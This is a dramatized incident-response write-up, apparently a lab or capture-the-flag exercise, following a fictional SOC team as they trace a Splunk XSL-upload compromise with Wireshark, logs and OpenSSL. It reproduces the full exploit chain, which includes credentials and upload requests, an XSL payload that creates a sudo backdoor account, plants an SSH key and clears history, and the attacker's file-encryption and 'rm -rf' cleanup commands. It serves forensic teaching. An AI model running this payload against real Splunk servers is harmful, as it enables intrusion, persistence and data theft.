---
title: "Incident Response"
date: 2024-10-25T13:43:53-06:00
draft: false
image: brand_image.jpg
tags: ["Wireshark", "Openssl"]
series: "Hunting the hunter"
---

- Reading time : "8 min read"

# GETI City Cyber Crisis

## Episode 1: The Breach

---

> _In the heart of Golang Country stands GETI City - a metropolis where technology and ambition touch the sky..._

---

### Scene 1: The City

The winter wind howls through GETI City's glass-and-steel canyons, carrying whispers of digital secrets between towering skyscrapers. Neon signs pierce the darkness, their glow reflecting off the frost-covered windows of Brukley Company's cybersecurity headquarters.

---

### Scene 2: The Alert

```
[CRITICAL ALERT]
Time: 23:47
Location: Brukley Company SOC
Status: ⚠️ SECURITY BREACH DETECTED ⚠️
```

---

### Scene 3: The SOC Room

_The Security Operations Center thrums with tension. Rows of monitors cast an eerie blue glow across worried faces. In the corner, John's workspace has become the epicenter of chaos._

**John** [hands trembling over keyboard]:  
"This isn't normal... The file just... disappeared. Like it was never there."

**Team** [gathering around]:  
_The soft whir of cooling fans is the only sound as they watch John's screen in horrified silence._

---

### Scene 4: The Discovery

**Thomas** [leaning forward, squinting]:  
"Wait. That account... it wasn't there five minutes ago."  
_His finger traces across the screen, pointing to a username that shouldn't exist._

**John**:  
"How did we miss this?"

---

### Scene 5: The Response

**Marcos** [commanding presence, SOC team leader]:  
"Listen up! I want:

- Full network captures
- System logs from the last 48 hours
- Memory dumps from John's machine
- All access logs from the authentication servers

We're not losing this trail."

---

### Scene 6: The Investigation

_Montage sequence:_

- Screens fill with scrolling logs
- USB drives blink frantically
- Network cables snake across desks
- Commands fly across terminals
- Coffee cups multiply

---

### Scene 7: The Call for Help

_The team exchanges knowing looks. There's only one person who can unravel this digital nightmare..._

---

### Scene 8: Enter **Mona**

_The SOC room door hisses open. A figure stands in the doorway, silhouetted against the hallway lights. Her custom-built laptop glows with a soft, dangerous light._

**Mona** [stepping into the light]:  
"Show me what you've got. And someone better have decent coffee."

_Her fingers hover over her keyboard like a pianist about to begin a symphony of code._

---

## Episode 2: Digital Breadcrumbs

---

### Scene 1: The Analysis Begins

_The SOC room has transformed into Mona's temporary command center. Multiple monitors surround her, each reflecting the blue glow of packet analysis tools._

```
[Network Capture Stats]
Total Packets: 1,427
Time Range: 22:45:16 - 23:47:32
Capture Size: 2.3 MB
```

---

### Scene 2: The Hunt

_Mona's fingers dance across her mechanical keyboard, the clicking sounds rhythmic and purposeful._

**Mona** [muttering to herself]:  
"Let's see what stories these packets can tell..."

_She types her first filter command:_

```wireshark
http || https
```

---

### Scene 3: The Discovery

_The screen refreshes, packets reorganizing themselves like digital playing cards._

**John** [watching over her shoulder]:  
"Thirty packets... out of more than fourteen hundred?"

**Mona**:  
"Sometimes the smallest anomalies tell the biggest stories."

---

### Scene 4: The Splunk Connection

_Mona leans forward, her eyes narrowing at a particular sequence of packets._

**Mona** [to herself]:  
"The Splunk web UI connection... something's not right here."

---

### Scene 5: The Pattern

_Multiple screens show different aspects of the same traffic pattern. Mona's face is illuminated by the data scrolling past._

**Marcos**:  
"What are you seeing?"

**Mona** [highlighting sections of the capture]:  
"These request patterns... they're identical to..."
_Her voice trails off as she furiously types._

---

### Scene 6: The Revelation

```
POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1
Host: ubuntu:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept-Encoding: gzip, deflate, br
Accept: text/javascript, text/html, application/xml, text/xml, */*
Connection: keep-alive
X-Requested-With: XMLHttpRequest
X-Splunk-Form-Key: 7329280097253260706
Cookie: splunkd_8000=Qwwd^Wsu1LKIQ1wyhHD39Xh1hhVVVKhcBpjhRad2F4izvjbE9MV658229L3Y_DiEzPgBw5f^ZzybEUBBnOgjDZNxniMCUm4YdpAeQ2mnRgzNuA8JJ5qHZUsjDcOrrmiYnRaCnqY; splunkweb_csrf_token_8000=7329280097253260706; session_id_8000=df3ea150f1987e9303605bbaa9a30fae85cc6fbe
Content-Length: 1559
Content-Type: multipart/form-data; boundary=701f565ce8c744fcd96cd368909b966e


Content-Disposition: form-data; name="spl-file"; filename="search.xsl"
Content-Type: application/xslt+xml

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/opt/splunk/bin/scripts/search.sh" method="text">
        <xsl:text>#!/bin/bash&#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx&#10;access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)&#10;echo &quot;nginx:$access&quot; | chpasswd&#10;usermod -aG sudo nginx&#10;mkdir /var/www/.ssh&#10;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org&quot; &gt; /var/www/.ssh/authorized_keys&#10;chown -R nginx:nginx /var/www/&#10;cat /dev/null &gt; /root/.bash_history</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

_The room falls silent as the implications sink in._

**Mona** [grimly]:  
"This exploit allows attackers to execute arbitrary commands through the Splunk web interface. Someone knew exactly what they were doing."

**Thomas** [pointing at the screen]:  
"That's exactly when my security alerts started firing!"

---

### Scene 7: The Evidence

_Mona pulls up multiple windows, creating a timeline of the attack:_

#### Step 1: Login

The exploitation process begins with sending a login HTTP `POST` request. The attacker requires user credentials to proceed.

```bash
POST /en-US/account/login HTTP/1.1
Host: ubuntu:8000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 78
Content-Type: application/x-www-form-urlencoded

username=johnnyC&password=h3Re15j0hnNy&set_has_logged_in=false
```

#### Step 2: Upload Malicious XSL File

After login, the attacker uploads a malicious XSL file, the main payload for this exploit:

```bash
POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1
Host: ubuntu:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept-Encoding: gzip, deflate, br
Accept: application/xml, */*
Connection: keep-alive
X-Splunk-Form-Key: 7329280097253260706
Cookie: splunkd_8000=Qwwd^Wsu1LKIQ1wyhHD39Xh1hhVVVKhcBpjhRad2F4izvjbE9MV658229L3Y_DiEzPgBw5f^ZzybEUBBnOgjDZNxniMCUm4YdpAeQ2mnRgzNuA8JJ5qHZUsjDcOrrmiYnRaCnqY; splunkweb_csrf_token_8000=7329280097253260706
Content-Length: 1559
Content-Type: multipart/form-data; boundary=701f565ce8c744fcd96cd368909b966e

Content-Disposition: form-data; name="spl-file"; filename="search.xsl"
Content-Type: application/xslt+xml
```

#### Step 3: Malicious Code in XSL File

The XSL file uploads a payload with the following commands:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/opt/splunk/bin/scripts/search.sh" method="text">
        <xsl:text>#!/bin/bash
adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx
access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
echo "nginx:$access" | chpasswd
usermod -aG sudo nginx
mkdir /var/www/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org" > /var/www/.ssh/authorized_keys
chown -R nginx:nginx /var/www/
cat /dev/null > /root/.bash_history</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

#### Explanation of the Malicious Code

- **Add User**: Adds a new user named `nginx` with a home directory of `/var/www/`.
- **Set Password**: Decodes and reverses a base64 password.
  ```bash
  access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
  ```
  **Decoded Password**: `f8287ec2-3f9a-4a39-9076-36546ebb6a93`
- **Set SSH Access**: Adds an RSA public key to allow SSH access for the `nginx` user.

#### Step 4: Trigger Code Execution

Once the malicious XSL file is uploaded, the vulnerable code path is accessed using the `getJobAsset` function by calling the job search endpoint with the dispatch ID:

```bash
POST /en-US/splunkd/__raw/servicesNS/johnnyC/search/search/jobs?output_mode=json HTTP/1.1
```

This ultimately allows the attacker to execute arbitrary code and escalate privileges.

This vulnerability has the relevant MITRE ATT&CK Techniques for Maintaining Persistence

##### 1. **Create Account (T1136)**

- **Description**: This technique involves an attacker creating a new user account on a compromised system.
- **Example**: An attacker could exploit the vulnerability to create a new account with administrative privileges, granting them ongoing access. This is often achieved via commands that add users with elevated permissions.

##### 2. **SSH Hijacking (T1203)**

- **Description**: By adding an SSH public key to the authorized keys of an existing or newly created user, an attacker can enable remote access without needing a password.
- **Example**: An attacker may inject a script to add their SSH key to a user’s `.ssh/authorized_keys` file, allowing them to maintain remote access independently of the original method of entry.

##### 3. **Account Manipulation (T1098)**

- **Description**: This technique involves modifying account permissions or configurations to retain access.
- **Example**: An attacker might modify an existing account by adding it to the `sudo` group or altering password settings to ensure persistent access.

### Scene 8: The Confirmation

_Mona swivels in her chair to face the team._

**Mona**:  
"We're dealing with someone who knows their CVEs. They exploited a vulnerability that was just published [Uptycs Blog](https://www.uptycs.com/blog/threat-research-report-team/splunk-vulnerability-cve-2023-46214). But they made one mistake..."

_She turns back to her screen, a slight smile playing at the corner of her mouth._

**Mona**:  
"They left breadcrumbs."

---

### Scene 9: The Next Step

_The team clusters around Mona's workspace, the tension palpable._

**Marcos**:  
"What do we do now?"

**Mona** [reaching for her custom USB drive]:  
"Now? We follow the trail. And I know exactly where it leads..."

---

## Episode 3: The Time Paradox

### Scene 1: The Timeline Puzzle

_The investigation room is quiet except for the soft hum of servers. Multiple screens display log files and system timestamps._

**Mona** [scrolling through logs]:  
"Something's not adding up here..."

**Thomas**:  
"What do you see?"

**Mona**:  
"The timestamps... they're dancing between two different time zones."

---

### Scene 2: The Discovery

_Mona pulls up the root/var/log/syslog entries on the main screen, the text reflecting off her glasses._

**Mona**:  
"Look at this. The system was originally in Pacific time..."

_She highlights a log entry:_

```
Apr 13 23:21:30 ubuntu gnome-shell[4904]: GNOME Shell started at Sat Apr 13 2024 23:21:22 GMT-0700 (PDT)
```

**John** [shifting uncomfortably]:  
"I had to adjust the timezone for better synchronization with the target systems."

**Mona**: "What about this one"

```bash
grep -i "timezone" var/log/syslog
```

The output confirms the timezone change:

```bash
Apr 13 23:24:56 ubuntu dbus-daemon[638]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.113' (uid=0 pid=5827 comm="timedatectl set-timezone Asia/Ho_Chi_Minh " label="unconfined")
```

---

### Scene 3: The Ripple Effect

_The team examines a complex timeline of events displayed across multiple monitors._

**Marcos**:  
"Ho Chi Minh City timezone... UTC+7. That's a fourteen-hour swing from PDT."

**Mona**:  
"And that's exactly what they were counting on. The time disparity created the perfect smoke screen."

---

### Scene 4: The Pattern Emerges

_A visualization appears showing two parallel timelines - one in PDT, one in Asia/Ho_Chi_Minh._

**Mona**:  
"They didn't just exploit our systems... they exploited time itself."

**Marcos**:  
"By operating in the gaps between timezone updates..."

**Mona** [finishing his thought]:  
"They created their own temporal blind spots. Brilliant and devastating."

---

### Scene 5: The Hunt Continues

_The room glows with the light of dozens of screens, each showing different aspects of the investigation._

**Mona**:  
"They thought they could hide in the gaps between seconds, between timezones..."

_She activates her tracking algorithm._

**Mona** [with a slight smile]:  
"But time... time always tells the truth."

## Episode 5: The Trail of Breadcrumbs

### Scene 1: The Log Analysis

_Mona's workspace is filled with terminal windows displaying auth.log entries. The soft glow of the screens illuminates her focused expression._

**Mona** [scanning through logs]:  
"Three minutes. They were in and out in just three minutes."

_She highlights a timestamp sequence:_

```
08:00:13 - User Created
08:03:08 - Session Terminated
```

**Thomas**:  
"That's surgical precision."

---

### Scene 2: The Pattern

_Multiple screens show the attacker's activities timeline. Mona pieces together the sequence._

**Mona**:  
"Watch how they moved..."

_She brings up key log entries:_

```
08:00:21 - SSH Connection Established
08:00:54 - First Command Execution
08:00:59 - Root Access Obtained
```

**Marcos**:  
"They knew exactly what they were after."

---

### Scene 3: The Encryption Key

_A terminal window displays the OpenSSL command used by the attacker._

**Mona** [leaning forward]:  
"Look at this encryption command. AES-256-CBC."

_She highlights the parameters:_

```
iv: 4fa17640b7dfe8799f072c65b15f581d
key: 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
```

**John**:  
"They encrypted something called 'data.zip'..."

---

### Scene 4: The Missing Files

_Mona pulls up the file operations log._

**Mona**:  
"They went straight for johnnycage's Documents folder."

_She displays the sequence:_

```
08:02:21 - Moved: Important.pdf
08:02:54 - Encrypted: data.zip
08:03:01 - Deleted: Both files
```

**Thomas** [grimly]:  
"First they take, then they clean."

---

### Scene 5: The Connection

_A whiteboard shows a diagram connecting all events from previous episodes._

**Mona**:  
"The XSL exploit from Episode 3, the timezone manipulation we found... it was all leading to this moment."

**Marcos**:  
"A perfectly choreographed attack."

---

### Scene 6: The IP Address

_Mona zooms in on the connection details._

**Mona**:  
"192.168.222.130 - Our ghost has an address."

_She brings up the SSH connection log:_

```
Accepted publickey for nginx from 192.168.222.130 port 43302
```

---

### Scene 7: The Root Access

_The team examines the privilege escalation sequence._

**Thomas**:  
"They didn't just create a user... they gave it sudo access immediately."

**Mona** [nodding]:  
"And look at the timing:"

```
08:00:13 - User nginx created
08:00:13 - Added to sudo group
08:00:59 - Switched to root
```

---

### Scene 8: The Decryption Attempt

_Mona starts working on breaking the encryption._

**Mona**:  
"They used AES-256... but they left us both the IV and the key."

_Her fingers fly across the keyboard:_

```
openssl enc -d -aes-256-cbc \
-iv 4fa17640b7dfe8799f072c65b15f581d \
-K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
```

---

### Scene 9: The Discovery

_A realization dawns on Mona's face as she examines the encryption parameters._

**Mona**:  
"This key... it's not random."

_She starts breaking down the hex string:_

```
3cabc6db78a034f69f16aa8986cf2e2c
ea05713b1e95ff9b2d80f6a71ae76b7d
```

**Mona** [with growing excitement]:  
"It's a message. They want us to decode something else entirely."

_The screen flickers as she begins a new analysis._

## Episode 6: Command and Control

### Scene 1: The Command History

_Mona opens a new terminal window, displaying the contents of .bash_history._

**Mona**:  
"Found their footprints."

_She projects the command history:_

```bash
whoami
cd /opt/splunk/bin/scripts/
sudo rm -rf search.sh
sudo su
```

**Thomas**:  
"Classic reconnaissance pattern."

---

### Scene 2: The File Trail

_Multiple screens show file operations and directory structures._

**Marcos** [pointing]:  
"Look at their movement pattern..."

**Mona**:  
"They went straight for johnnycage's documents. Just like we saw in the logs."

_She highlights the commands:_

```bash
cd /home/johnnycage/
sudo mv /home/johnnycage/Documents/Important.pdf .
zip data.zip *
```

---

### Scene 3: The Encryption Chain

_Mona analyzes the complex encryption command._

**Mona** [eyes widening]:  
"This is beautiful... in a terrifying way."

_She breaks down the command:_

```bash
sudo openssl enc -aes-256-cbc \
-iv $(cut -c 1-32 <<< $(uname -r | md5sum)) \
-K $(cut -c 1-64 <<< $(date +%s | sha256sum))
```

**John**:  
"They're using system properties to generate their keys?"

**Mona**:  
"The kernel version for the IV... system time for the key..."

---

### Scene 4: The Exfiltration Route

_A network diagram appears, showing the data's path._

**Mona**:  
"The final destination: 192.168.222.130, port 8080."

**Thomas**:  
"And they encoded it three times - encryption, base64, and EBCDIC."

**Mona**:  
"Like nesting dolls of obfuscation."

---

### Scene 5: The Clean-Up

_The final command glows ominously on the screen._

```bash
sudo rm -rf *
```

**Marcos**:  
"They tried to leave no trace..."

**Mona** [smiling]:  
"Except they did. In the very commands they used to hide."

---

## Episode 7: Digital Archaeology

### Scene 1: The Decryption Lab

_The team has set up a specialized workstation for data recovery. Multiple servers hum in the background._

**Mona**:  
"We have both pieces of the puzzle now."

_She displays the known parameters:_

```plaintext
IV: 4fa17640b7dfe8799f072c65b15f581d
Key: 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
```

---

### Scene 2: The Network Capture

_Thomas pulls up network traffic logs._

**Thomas**:  
"Got the EBCDIC-encoded transmission. Port 8080, just like in the command."

**Mona**:  
"Now we reverse their Russian doll encryption..."

---

### Scene 3: The Decryption Process

_Mona's fingers fly across the keyboard as she constructs the reverse process._

**Mona**:  
"First, convert from EBCDIC back to ASCII..."

_She types commands:_

```bash
dd conv=ascii < captured_data | \
base64 -d | \
openssl enc -d -aes-256-cbc \
-iv 4fa17640b7dfe8799f072c65b15f581d \
-K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
```

---

### Scene 4: The Breakthrough

_A progress bar fills as the decryption processes._

**Thomas**:  
"ZIP file structure detected!"

**Mona** [focused]:  
"The encryption peels away like layers of an onion..."

---

### Scene 5: The Recovery

_A file browser window opens, showing the contents of the recovered zip file._

**Marcos**:  
"Important.pdf... we got it back."

**Mona** [examining the file]:  
"But why this file? What made it so... important?"

---

### Scene 6: The Hidden Message

_Mona opens a hex editor, examining the PDF's metadata._

**Mona**:  
"Wait... there's something embedded in the PDF structure..."

_Her screen fills with hexadecimal values._

**John**:  
"What is it?"

**Mona** [leaning closer]:  
"A message... and coordinates?"

---

### Scene 7: The Next Lead

_The team gathers around Mona's main screen._

**Mona**:  
"The file wasn't the target... it was the messenger."

_She brings up a map with the extracted coordinates._

**Mona**:  
"And now we know where they're going next."
